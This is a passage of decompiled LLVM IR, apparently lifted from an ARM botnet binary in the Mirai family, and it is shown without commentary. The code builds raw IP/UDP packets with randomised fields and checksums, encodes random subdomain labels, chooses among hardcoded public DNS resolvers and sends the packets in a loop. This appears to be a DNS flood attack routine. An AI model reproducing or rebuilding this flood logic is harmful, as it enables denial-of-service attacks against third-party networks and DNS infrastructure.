  %v0_c65c = load i32, i32* @r4, align 4
  store i32 %v0_c65c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_c664

dec_label_pc_c664:                                ; preds = %.thread18, %dec_label_pc_c658
  %v0_c670 = phi i32 [ %storemerge, %.thread18 ], [ 0, %dec_label_pc_c658 ]
  %v0_c674 = phi i32 [ %v0_c688, %.thread18 ], [ 0, %dec_label_pc_c658 ]
  %v1_c664 = load i32, i32* @r7, align 4
  %v2_c664 = add i32 %v1_c664, %v0_c674
  %v3_c664 = inttoptr i32 %v2_c664 to i8*
  %v4_c664 = load i8, i8* %v3_c664, align 1
  %v6_c664 = zext i8 %v4_c664 to i32
  store i32 %v6_c664, i32* %r3.global-to-local, align 4
  %v7_c668 = icmp eq i8 %v4_c664, 46
  store i1 %v7_c668, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c668, label %bb118, label %.thread60

.thread60:                                        ; preds = %dec_label_pc_c664
  %v1_c67014 = add nsw i32 %v0_c670, 1
  store i32 %v1_c67014, i32* %r2.global-to-local, align 4
  %v1_c67416 = add i32 %v0_c674, 1
  store i32 %v1_c67416, i32* %r1.global-to-local, align 4
  br label %bb119

bb118:                                            ; preds = %dec_label_pc_c664
  %v2_c66c = load i32, i32* @r4, align 4
  %v3_c66c = add i32 %v2_c66c, %v0_c674
  store i32 %v3_c66c, i32* %r3.global-to-local, align 4
  %v1_c670 = add nsw i32 %v0_c670, 1
  store i32 %v1_c670, i32* %r2.global-to-local, align 4
  %v1_c674 = add i32 %v0_c674, 1
  store i32 %v1_c674, i32* %r1.global-to-local, align 4
  %v2_c678 = trunc i32 %v0_c670 to i8
  %v3_c678 = load i32, i32* %r0.global-to-local, align 4
  %v4_c678 = inttoptr i32 %v3_c678 to i8*
  store i8 %v2_c678, i8* %v4_c678, align 1
  %v0_c67c.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c67c.pre, label %bb120, label %bb118.bb119_crit_edge

bb118.bb119_crit_edge:                            ; preds = %bb118
  %v1_c67c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb119

bb119:                                            ; preds = %bb118.bb119_crit_edge, %.thread60
  %v1_c67c = phi i32 [ %v1_c67c.pre, %bb118.bb119_crit_edge ], [ %v1_c67014, %.thread60 ]
  %v2_c67c = urem i32 %v1_c67c, 256
  br label %.thread18

bb120:                                            ; preds = %bb118
  %v1_c680 = load i32, i32* %r3.global-to-local, align 4
  %v2_c680 = add i32 %v1_c680, 1
  store i32 %v2_c680, i32* %r0.global-to-local, align 4
  br label %.thread18

.thread18:                                        ; preds = %bb119, %bb120
  %storemerge = phi i32 [ %v2_c67c, %bb119 ], [ 0, %bb120 ]
  store i32 %storemerge, i32* %ip.global-to-local, align 4
  %v0_c688 = load i32, i32* %r1.global-to-local, align 4
  %v1_c688 = load i32, i32* @r6, align 4
  %v9_c688 = icmp eq i32 %v0_c688, %v1_c688
  store i1 %v9_c688, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c688, label %dec_label_pc_c690.loopexit, label %dec_label_pc_c664

dec_label_pc_c690.loopexit:                       ; preds = %.thread18
  %v2_c690.pre = load i32, i32* %r0.global-to-local, align 4
  %extract.t131 = trunc i32 %storemerge to i8
  br label %dec_label_pc_c690

dec_label_pc_c690:                                ; preds = %bb117, %dec_label_pc_c690.loopexit
  %v0_c690.off0 = phi i8 [ %extract.t131, %dec_label_pc_c690.loopexit ], [ 0, %bb117 ]
  %v2_c690 = phi i32 [ %v2_c690.pre, %dec_label_pc_c690.loopexit ], [ %v5_c64c, %bb117 ]
  %v3_c690 = inttoptr i32 %v2_c690 to i8*
  store i8 %v0_c690.off0, i8* %v3_c690, align 1
  %v3_c694 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c694, i32* %r3.global-to-local, align 4
  %v1_c698 = add i32 %v3_c694, 1
  store i32 %v1_c698, i32* @r5, align 4
  %v0_c69c = load i32, i32* @r4, align 4
  %v1_c69c = load i32, i32* @r6, align 4
  %v2_c69c = add i32 %v1_c69c, %v0_c69c
  store i32 %v2_c69c, i32* %r2.global-to-local, align 4
  store i32 256, i32* @lr, align 4
  %v0_c6a4 = load i32, i32* @r8, align 4
  %v9_c6a4 = icmp eq i32 %v0_c6a4, %v1_c698
  store i1 %v9_c6a4, i1* %cpsr_z.global-to-local, align 1
  %v3_c6a8 = add i32 %v2_c69c, 4
  %v4_c6a8 = inttoptr i32 %v3_c6a8 to i16*
  store i16 256, i16* %v4_c6a8, align 2
  %v0_c6ac = load i32, i32* @lr, align 4
  %v1_c6ac = trunc i32 %v0_c6ac to i16
  %v2_c6ac = load i32, i32* %r2.global-to-local, align 4
  %v3_c6ac = add i32 %v2_c6ac, 2
  %v4_c6ac = inttoptr i32 %v3_c6ac to i16*
  store i16 %v1_c6ac, i16* %v4_c6ac, align 2
  %v0_c6b0 = load i32, i32* @r5, align 4
  store i32 %v0_c6b0, i32* %stack_var_-44, align 4
  %v8_c6b4 = icmp sgt i32 %v0_c6a4, %v1_c698
  br i1 %v8_c6b4, label %dec_label_pc_c570, label %dec_label_pc_c6b8

dec_label_pc_c6b8:                                ; preds = %dec_label_pc_c690
  store i32 %v4_c5dc, i32* %r0.global-to-local, align 4
  %v0_c6bc = load i32, i32* @r6, align 4
  %v2_c6bc = add i32 %v0_c6bc, %v4_c5dc
  store i32 %v2_c6bc, i32* @r7, align 4
  %v0_c6c4.pre.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_c6c0.preheader

dec_label_pc_c6c0.preheader:                      ; preds = %.dec_label_pc_c6c0.preheader_crit_edge, %dec_label_pc_c6b8
  %v4_c724.pre-phi = phi i32 [ %.pre, %.dec_label_pc_c6c0.preheader_crit_edge ], [ %v4_c5dc, %dec_label_pc_c6b8 ]
  %v0_c6c4.pre = phi i32 [ 0, %.dec_label_pc_c6c0.preheader_crit_edge ], [ %v0_c6c4.pre.pre, %dec_label_pc_c6b8 ]
  %v9_c6f0 = icmp eq i32 %v3_c494, add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1)
  %v9_c700 = icmp eq i32 %v3_c49c, add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1)
  br label %dec_label_pc_c6c0

dec_label_pc_c6c0:                                ; preds = %dec_label_pc_c6c0, %dec_label_pc_c7b8, %dec_label_pc_c6c0.preheader
  %v0_c6c4 = phi i32 [ %v0_c6c4.pre, %dec_label_pc_c6c0.preheader ], [ 0, %dec_label_pc_c7b8 ], [ 0, %dec_label_pc_c6c0 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c6c4 = icmp eq i32 %v0_c6c4, 0
  store i1 %v2_c6c4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c6c4, label %dec_label_pc_c6c0, label %dec_label_pc_c6d0

dec_label_pc_c6d0:                                ; preds = %dec_label_pc_c6c0, %dec_label_pc_c7b8
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_c6d4 = load i32, i32* @r7, align 4
  %v1_c6d4 = add i32 %v0_c6d4, 27
  store i32 %v1_c6d4, i32* @sb, align 4
  %v1_c6d8 = add i32 %v0_c6d4, 47
  store i32 %v1_c6d8, i32* @sl, align 4
  br label %dec_label_pc_c6dc

dec_label_pc_c6dc:                                ; preds = %dec_label_pc_c720, %dec_label_pc_c6d0
  %v1_c6e8 = phi i32 [ %v1_c7a8, %dec_label_pc_c720 ], [ 0, %dec_label_pc_c6d0 ]
  store i32 %v2_c1ec, i32* %r3.global-to-local, align 4
  store i32 %v3_c494, i32* %ip.global-to-local, align 4
  %v4_c6e8 = mul i32 %v1_c6e8, 4
  %v5_c6e8 = add i32 %v4_c6e8, %v2_c1ec
  %v6_c6e8 = inttoptr i32 %v5_c6e8 to i32*
  %v7_c6e8 = load i32, i32* %v6_c6e8, align 4
  store i32 %v7_c6e8, i32* @r4, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* @r5, align 4
  store i1 %v9_c6f0, i1* %cpsr_z.global-to-local, align 1
  %v1_c6f4 = add i32 %v7_c6e8, 20
  store i32 %v1_c6f4, i32* @r6, align 4
  br i1 %v9_c6f0, label %dec_label_pc_c7cc, label %dec_label_pc_c6fc

dec_label_pc_c6fc:                                ; preds = %dec_label_pc_c6dc
  store i32 %v3_c49c, i32* @lr, align 4
  store i1 %v9_c700, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c700, label %dec_label_pc_c7e0, label %dec_label_pc_c708

dec_label_pc_c708:                                ; preds = %dec_label_pc_c7cc.dec_label_pc_c708_crit_edge, %dec_label_pc_c6fc
  %v1_c70c = phi i32 [ %v1_c70c.pre, %dec_label_pc_c7cc.dec_label_pc_c708_crit_edge ], [ add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), %dec_label_pc_c6fc ]
  store i32 %v3_c4b8, i32* %r0.global-to-local, align 4
  %v9_c70c = icmp eq i32 %v3_c4b8, %v1_c70c
  store i1 %v9_c70c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c70c, label %dec_label_pc_c7f4, label %dec_label_pc_c714

dec_label_pc_c714:                                ; preds = %dec_label_pc_c7e0, %dec_label_pc_c708
  %v1_c718 = phi i32 [ %v1_c7ec, %dec_label_pc_c7e0 ], [ %v1_c70c, %dec_label_pc_c708 ]
  store i32 %v3_c4c0, i32* %r2.global-to-local, align 4
  %v9_c718 = icmp eq i32 %v3_c4c0, %v1_c718
  store i1 %v9_c718, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c718, label %dec_label_pc_c808, label %dec_label_pc_c720

dec_label_pc_c720:                                ; preds = %dec_label_pc_c7f4, %dec_label_pc_c714, %dec_label_pc_c808
  %v0_c720 = load i32, i32* @r4, align 4
  %v1_c720 = add i32 %v0_c720, 41
  store i32 %v1_c720, i32* %r0.global-to-local, align 4
  store i32 %v4_c724.pre-phi, i32* %r1.global-to-local, align 4
  %v2_c728 = call i32 @rand_alpha_str(i32 %v1_c720, i32 %v4_c724.pre-phi)
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c730 = load i32, i32* @r4, align 4
  %v3_c730 = add i32 %v2_c730, 10
  %v4_c730 = inttoptr i32 %v3_c730 to i16*
  store i16 0, i16* %v4_c730, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_c738 = load i32, i32* @r4, align 4
  store i32 %v0_c738, i32* @r0, align 4
  %v2_c73c = call i32 @checksum_generic(i32 %v0_c738, i32 20)
  %v3_c73c = trunc i32 %v2_c73c to i16
  store i32 %v2_c73c, i32* %r0.global-to-local, align 4
  %v3_c740 = load i32, i32* @r4, align 4
  %v4_c740 = add i32 %v3_c740, 10
  %v5_c740 = inttoptr i32 %v4_c740 to i16*
  store i16 %v3_c73c, i16* %v5_c740, align 2
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_c748 = load i32, i32* @r6, align 4
  %v3_c748 = add i32 %v2_c748, 6
  %v4_c748 = inttoptr i32 %v3_c748 to i16*
  store i16 0, i16* %v4_c748, align 2
  %v0_c74c = load i32, i32* @r6, align 4
  store i32 %v0_c74c, i32* @r1, align 4
  %v1_c750 = add i32 %v0_c74c, 4
  %v2_c750 = inttoptr i32 %v1_c750 to i16*
  %v3_c750 = load i16, i16* %v2_c750, align 2
  %v4_c750 = zext i16 %v3_c750 to i32
  store i32 %v4_c750, i32* %r2.global-to-local, align 4
  %v0_c754 = load i32, i32* @sb, align 4
  store i32 %v0_c754, i32* %r3.global-to-local, align 4
  %v0_c758 = load i32, i32* @r4, align 4
  store i32 %v0_c758, i32* %r0.global-to-local, align 4
  %v4_c75c = call i32 @checksum_tcpudp(i32 %v0_c758, i32 %v0_c74c, i32 %v4_c750, i32 %v0_c754)
  %v5_c75c = trunc i32 %v4_c75c to i16
  store i32 %v4_c75c, i32* %r0.global-to-local, align 4
  %v3_c760 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c760, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @lr, align 4
  %v3_c768 = mul i32 %v3_c760, 32
  store i32 %v3_c768, i32* %ip.global-to-local, align 4
  %v3_c76c = load i32, i32* @r6, align 4
  %v4_c76c = add i32 %v3_c76c, 6
  %v5_c76c = inttoptr i32 %v4_c76c to i16*
  store i16 %v5_c75c, i16* %v5_c76c, align 2
  %v0_c770 = load i32, i32* %ip.global-to-local, align 4
  %v1_c770 = load i32, i32* %r3.global-to-local, align 4
  %tmp133 = mul i32 %v1_c770, -8
  %v5_c770 = add i32 %v0_c770, %tmp133
  store i32 %v5_c770, i32* %ip.global-to-local, align 4
  %v0_c774 = load i32, i32* @r6, align 4
  %v1_c774 = add i32 %v0_c774, 2
  %v2_c774 = inttoptr i32 %v1_c774 to i16*
  %v3_c774 = load i16, i16* %v2_c774, align 2
  %v4_c774 = zext i16 %v3_c774 to i32
  store i32 %v4_c774, i32* @r6, align 4
  %v1_c778 = load i32, i32* @lr, align 4
  %v2_c778 = add i32 %v1_c778, %v5_c770
  store i32 %v2_c778, i32* %ip.global-to-local, align 4
  %v3_c77c = add i32 %v2_c778, 2
  %v4_c77c = inttoptr i32 %v3_c77c to i16*
  store i16 %v3_c774, i16* %v4_c77c, align 2
  %v0_c780 = load i32, i32* @fp, align 4
  %v1_c780 = load i32, i32* %ip.global-to-local, align 4
  %v2_c780 = add i32 %v1_c780, 4
  %v3_c780 = inttoptr i32 %v2_c780 to i32*
  store i32 %v0_c780, i32* %v3_c780, align 4
  %v0_c784 = load i32, i32* @r4, align 4
  store i32 %v0_c784, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 %v3_c438, i32* %r0.global-to-local, align 4
  %v0_c790 = load i32, i32* @sl, align 4
  store i32 %v0_c790, i32* %r2.global-to-local, align 4
  store i32 16, i32* @r4, align 4
  %v0_c798 = load i32, i32* %ip.global-to-local, align 4
  %v6_c7a0 = call i32 @__libc_sendto(i32 %v3_c438, i32 %v0_c784, i32 %v0_c790, i32 16384, i32 %v0_c798, i32 16)
  %v3_c7a4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c7a4, i32* %r3.global-to-local, align 4
  %v1_c7a8 = add i32 %v3_c7a4, 1
  store i32 %v1_c7a8, i32* %r0.global-to-local, align 4
  %v0_c7ac = load i32, i32* @r8, align 4
  %v9_c7ac = icmp eq i32 %v0_c7ac, %v1_c7a8
  store i1 %v9_c7ac, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c7a8, i32* %stack_var_-44, align 4
  %v8_c7b4 = icmp sgt i32 %v0_c7ac, %v1_c7a8
  br i1 %v8_c7b4, label %dec_label_pc_c6dc, label %dec_label_pc_c7b8

dec_label_pc_c7b8:                                ; preds = %dec_label_pc_c720
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c7bc = icmp eq i32 %v0_c7ac, 0
  store i1 %v2_c7bc, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c7bc, label %dec_label_pc_c6c0, label %dec_label_pc_c6d0

dec_label_pc_c7cc:                                ; preds = %dec_label_pc_c6dc
  %v0_c7cc = call i32 @rand_next()
  %v1_c7cc = trunc i32 %v0_c7cc to i16
  store i32 %v0_c7cc, i32* %r0.global-to-local, align 4
  store i32 %v3_c49c, i32* @lr, align 4
  %v1_c7d4 = load i32, i32* @r5, align 4
  %v9_c7d4 = icmp eq i32 %v3_c49c, %v1_c7d4
  store i1 %v9_c7d4, i1* %cpsr_z.global-to-local, align 1
  %v3_c7d8 = load i32, i32* @r4, align 4
  %v4_c7d8 = add i32 %v3_c7d8, 4
  %v5_c7d8 = inttoptr i32 %v4_c7d8 to i16*
  store i16 %v1_c7cc, i16* %v5_c7d8, align 2
  br i1 %v9_c7d4, label %dec_label_pc_c7e0, label %dec_label_pc_c7cc.dec_label_pc_c708_crit_edge

dec_label_pc_c7cc.dec_label_pc_c708_crit_edge:    ; preds = %dec_label_pc_c7cc
  %v1_c70c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_c708

dec_label_pc_c7e0:                                ; preds = %dec_label_pc_c7cc, %dec_label_pc_c6fc
  %v0_c7e0 = call i32 @rand_next()
  %v1_c7e0 = trunc i32 %v0_c7e0 to i16
  %v3_c7e4 = load i32, i32* @r4, align 4
  %v4_c7e4 = add i32 %v3_c7e4, 20
  %v5_c7e4 = inttoptr i32 %v4_c7e4 to i16*
  store i16 %v1_c7e0, i16* %v5_c7e4, align 2
  store i32 %v3_c4b8, i32* %r0.global-to-local, align 4
  %v1_c7ec = load i32, i32* @r5, align 4
  %v9_c7ec = icmp eq i32 %v3_c4b8, %v1_c7ec
  store i1 %v9_c7ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c7ec, label %dec_label_pc_c7f4, label %dec_label_pc_c714

dec_label_pc_c7f4:                                ; preds = %dec_label_pc_c7e0, %dec_label_pc_c708
  %v0_c7f4 = call i32 @rand_next()
  %v1_c7f4 = trunc i32 %v0_c7f4 to i16
  store i32 %v0_c7f4, i32* %r0.global-to-local, align 4
  store i32 %v3_c4c0, i32* %r2.global-to-local, align 4
  %v1_c7fc = load i32, i32* @r5, align 4
  %v9_c7fc = icmp eq i32 %v3_c4c0, %v1_c7fc
  store i1 %v9_c7fc, i1* %cpsr_z.global-to-local, align 1
  %v3_c800 = load i32, i32* @r6, align 4
  %v4_c800 = add i32 %v3_c800, 2
  %v5_c800 = inttoptr i32 %v4_c800 to i16*
  store i16 %v1_c7f4, i16* %v5_c800, align 2
  br i1 %v9_c7fc, label %dec_label_pc_c808, label %dec_label_pc_c720

dec_label_pc_c808:                                ; preds = %dec_label_pc_c7f4, %dec_label_pc_c714
  %v0_c808 = call i32 @rand_next()
  %v1_c808 = trunc i32 %v0_c808 to i16
  store i32 %v0_c808, i32* %r0.global-to-local, align 4
  %v3_c80c = load i32, i32* @r4, align 4
  %v4_c80c = add i32 %v3_c80c, 28
  %v5_c80c = inttoptr i32 %v4_c80c to i16*
  store i16 %v1_c808, i16* %v5_c80c, align 2
  br label %dec_label_pc_c720

dec_label_pc_c814:                                ; preds = %dec_label_pc_c39c, %dec_label_pc_c37c, %dec_label_pc_c320, %entry
  %v0_c814 = call i32 @rand_next()
  %v1_c818 = urem i32 %v0_c814, 4
  store i32 %v1_c818, i32* %r0.global-to-local, align 4
  %v2_c81c = icmp eq i32 %v1_c818, 3
  store i1 %v2_c81c, i1* %cpsr_z.global-to-local, align 1
  %trunc = trunc i32 %v0_c814 to i2
  switch i2 %trunc, label %dec_label_pc_c4189 [
    i2 0, label %dec_label_pc_c874
    i2 1, label %dec_label_pc_c86c
    i2 -2, label %dec_label_pc_c860
    i2 -1, label %dec_label_pc_c850
  ]

dec_label_pc_c838:                                ; preds = %dec_label_pc_c448
  store i32 %v3_c438, i32* %r0.global-to-local, align 4
  %v1_c83c = call i32 @__GI___libc_close(i32 %v3_c438)
  store i32 %v1_c83c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c840

dec_label_pc_c840:                                ; preds = %dec_label_pc_c420, %dec_label_pc_c418, %dec_label_pc_c838
  %v1_c84c = phi i32 [ %v3_c438, %dec_label_pc_c420 ], [ %v1_c84c50, %dec_label_pc_c418 ], [ %v1_c83c, %dec_label_pc_c838 ]
  store i32 %v18_c1cc, i32* %sb.global-to-local, align 4
  store i32 %v27_c1cc, i32* %lr.global-to-local, align 4
  ret i32 %v1_c84c

dec_label_pc_c850:                                ; preds = %dec_label_pc_c814
  store i32 33686020, i32* @fp, align 4
  br label %dec_label_pc_c418

dec_label_pc_c860:                                ; preds = %dec_label_pc_c814
  store i32 104859200, i32* @fp, align 4
  br label %dec_label_pc_c418

dec_label_pc_c86c:                                ; preds = %dec_label_pc_c814
  store i32 707416650, i32* @fp, align 4
  br label %dec_label_pc_c418

dec_label_pc_c874:                                ; preds = %dec_label_pc_c814
  store i32 134744072, i32* @fp, align 4
  br label %dec_label_pc_c418

; uselistorder directives
  uselistorder i32 %v1_c818, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v0_c814, { 1, 0 }
  uselistorder i32 %v0_c808, { 1, 0 }
  uselistorder i32 %v0_c7f4, { 1, 0 }
  uselistorder i32 %v1_c7ec, { 1, 0 }
  uselistorder i32 %v0_c7cc, { 1, 0 }
  uselistorder i32 %v1_c7a8, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_c770, { 1, 0 }
  uselistorder i32 %v4_c75c, { 1, 0 }
  uselistorder i32 %v2_c73c, { 1, 0 }
  uselistorder i32 %v4_c724.pre-phi, { 1, 0 }
  uselistorder i32 %v1_c698, { 1, 0, 2 }
  uselistorder i32 %v0_c688, { 1, 0 }
  uselistorder i32 %storemerge, { 0, 2, 1 }
  uselistorder i32 %v0_c674, { 2, 0, 3, 1 }
  uselistorder i32 %v0_c670, { 1, 0, 2 }
  uselistorder i32 %v0_c5e0, { 1, 0 }
  uselistorder i32 %v4_c5dc, { 2, 0, 3, 4, 1 }
  uselistorder i32 %tmp112, { 1, 0 }
  uselistorder i32 %v3_c528, { 1, 0 }
  uselistorder i32 %v3_c4e4, { 1, 0 }
  uselistorder i32 %v1_c4d8, { 2, 0, 1 }
  uselistorder i32 %v3_c4a4, { 1, 0 }
  uselistorder i32 %v3_c49c, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %v3_c494, { 1, 0, 2 }
  uselistorder i8 %v5_c48c, { 1, 0, 2 }
  uselistorder i32 %v1_c478, { 1, 0 }
  uselistorder i32 %v0_c478, { 1, 0 }
  uselistorder i1 %v7_c468, { 1, 0 }
  uselistorder i1 %v7_c43c, { 1, 0 }
  uselistorder i32 %v3_c438, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v0_c418, { 1, 0, 2 }
  uselistorder i32 %v2_c3e8, { 0, 1, 3, 2 }
  uselistorder i32 %v2_c3e4, { 1, 0, 2 }
  uselistorder i1 %v7_c3d0, { 1, 0 }
  uselistorder i32 %v1_c3cc, { 1, 0, 2 }
  uselistorder i1 %v8_c3c4, { 1, 0 }
  uselistorder i1 %v7_c3c0, { 1, 0 }
  uselistorder i32 %v1_c3b4, { 1, 0 }
  uselistorder i8 %v2_c3a8, { 2, 0, 1, 3 }
  uselistorder i32 %v0_c3ac, { 1, 0 }
  uselistorder i32 %v0_c3cc, { 3, 0, 2, 1 }
  uselistorder i32 %v0_c39c, { 0, 2, 1 }
  uselistorder i32 %v1_c3b0, { 0, 2, 1 }
  uselistorder i32 %v2_c384, { 1, 0, 2, 3 }
  uselistorder i32 %v0_c37c, { 1, 0, 2, 3 }
  uselistorder i1 %v7_c374, { 1, 0 }
  uselistorder i32 %v0_c374, { 2, 3, 4, 1, 6, 5, 0 }
  uselistorder i32 %v0_c318, { 1, 0, 3, 2 }
  uselistorder i32 %v6_c2b8, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v6_c29c, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v6_c284, { 2, 1, 0, 3 }
  uselistorder i32 %v1_c26c, { 1, 2, 0 }
  uselistorder i32 %v5_c260, { 0, 2, 1 }
  uselistorder i32 %v7_c228, { 1, 0, 2, 3 }
  uselistorder i32 %v5_c228, { 0, 2, 1 }
  uselistorder i32 %v2_c1ec, { 0, 3, 1, 2, 4 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32* %r3.global-to-local, { 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 34, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 30, 31, 32, 33, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 1, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 34, 33, 36, 35, 37, 39, 38, 41, 40, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 2, 4, 6, 5, 8, 7, 9, 11, 10, 12, 13, 14, 16, 15, 19, 17, 18, 20, 21, 26, 22, 23, 24, 25, 30, 27, 28, 29, 31, 33, 32, 34, 35, 36, 37, 39, 38, 40, 41, 42, 43, 44, 46, 45, 48, 47, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 10, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 24, 26, 27, 28, 25, 22, 29, 30, 31 }
  uselistorder i16 64, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 41, { 2, 3, 4, 0, 1 }
  uselistorder i32 (i32)* @inet_addr, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), { 0, 2, 1, 3, 17, 16, 19, 45, 18, 46, 4, 6, 5, 20, 47, 21, 48, 50, 7, 51, 49, 22, 52, 23, 53, 24, 54, 55, 56, 25, 57, 58, 8, 60, 59, 29, 61, 28, 62, 26, 63, 27, 64, 66, 9, 67, 65, 68, 69, 33, 70, 32, 71, 30, 72, 31, 73, 11, 10, 74, 75, 34, 76, 35, 77, 13, 12, 78, 79, 36, 80, 37, 81, 82, 83, 38, 84, 85, 86, 87, 14, 88, 89, 39, 90, 40, 91, 41, 92, 93, 94, 15, 95, 96, 44, 97, 42, 98, 43, 99 }
  uselistorder i32 (i32, i32*, i32, i32, i32)* @attack_get_opt_int, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 87, 88, 89, 90, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_c840, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c720, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c6d0, { 1, 0 }
  uselistorder label %dec_label_pc_c6c0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_c6c0.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_c690, { 1, 0 }
  uselistorder label %.thread18, { 1, 0 }
  uselistorder label %.thread11, { 1, 0 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %dec_label_pc_c3e0, { 1, 0 }
  uselistorder label %dec_label_pc_c3d0, { 1, 0 }
  uselistorder label %dec_label_pc_c39c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c394, { 1, 0 }
}

define i32 @checksum_generic(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = or i32 %arg1, 1
  %tmp9 = icmp eq i32 %tmp, 1
  br i1 %tmp9, label %dec_label_pc_c8b0, label %dec_label_pc_c898

dec_label_pc_c898:                                ; preds = %entry
  %v0_c8a0.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_c89c

dec_label_pc_c89c:                                ; preds = %dec_label_pc_c89c, %dec_label_pc_c898
  %v0_c8a8 = phi i32 [ %v2_c8a8, %dec_label_pc_c89c ], [ 0, %dec_label_pc_c898 ]
  %v0_c8a0 = phi i32 [ %v5_c8a0, %dec_label_pc_c89c ], [ %v0_c8a0.pre, %dec_label_pc_c898 ]
  %v0_c89c = phi i32 [ %v1_c89c, %dec_label_pc_c89c ], [ %arg1, %dec_label_pc_c898 ]
  %v1_c89c = add i32 %v0_c89c, -2
  %v1_c8a0 = inttoptr i32 %v0_c8a0 to i16*
  %v2_c8a0 = load i16, i16* %v1_c8a0, align 2
  %v3_c8a0 = zext i16 %v2_c8a0 to i32
  %v5_c8a0 = add i32 %v0_c8a0, -2
  store i32 %v5_c8a0, i32* @r0, align 4
  %v2_c8a8 = add i32 %v3_c8a0, %v0_c8a8
  %v1_c89c.cmp = icmp ugt i32 %v1_c89c, 1
  br i1 %v1_c89c.cmp, label %dec_label_pc_c89c, label %dec_label_pc_c8b0.loopexit

dec_label_pc_c8b0.loopexit:                       ; preds = %dec_label_pc_c89c
  br label %dec_label_pc_c8b0

dec_label_pc_c8b0:                                ; preds = %entry, %dec_label_pc_c8b0.loopexit
  %v1_c8b8 = phi i32 [ %v2_c8a8, %dec_label_pc_c8b0.loopexit ], [ 0, %entry ]
  %v0_c8b0 = phi i32 [ %v1_c89c, %dec_label_pc_c8b0.loopexit ], [ %arg1, %entry ]
  %v7_c8b0 = icmp eq i32 %v0_c8b0, 1
  br i1 %v7_c8b0, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_c8b0
  %v1_c8b4 = load i32, i32* @r0, align 4
  %v2_c8b4 = inttoptr i32 %v1_c8b4 to i8*
  %v3_c8b4 = load i8, i8* %v2_c8b4, align 1
